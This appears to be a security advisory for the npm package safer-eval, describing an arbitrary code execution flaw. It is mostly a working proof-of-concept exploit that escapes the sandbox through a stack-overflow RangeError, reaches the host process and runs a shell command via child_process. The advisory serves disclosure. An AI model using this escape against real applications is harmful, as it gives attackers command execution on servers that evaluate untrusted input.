# Overview
[safer-eval](https://www.npmjs.com/package/safer-eval) is a safer approach for eval in node and browser.

Affected versions of this package are vulnerable to Arbitrary Code Execution via generating a  `RangeError: Maximum call stack size exceeded`.

# Proof of Concept (Credit: Jonathan Leitschuh)
```js
const theFunction = function () {
  const f = Buffer.prototype.write;
  const ft = {
    length: 10,
    utf8Write(){}
  };
  function r(i){
    var x = 0;
    try{
      x = r(i);
    }catch(e){}
    if(typeof(x)!=='number')
      return x;
    if(x!==i)
      return x+1;
    try{
      f.call(ft);
    }catch(e){
      return e;
    }
    return null;
  }
  var i=1;
  while(1){
    try{
      i=r(i).constructor.constructor("return process")();
      break;
    }catch(x){
      i++;
    }
  }
  return i.mainModule.require("child_process").execSync("id").toString()
};
const untrusted = `(${theFunction})()`;

console.log(saferEval(untrusted));
```
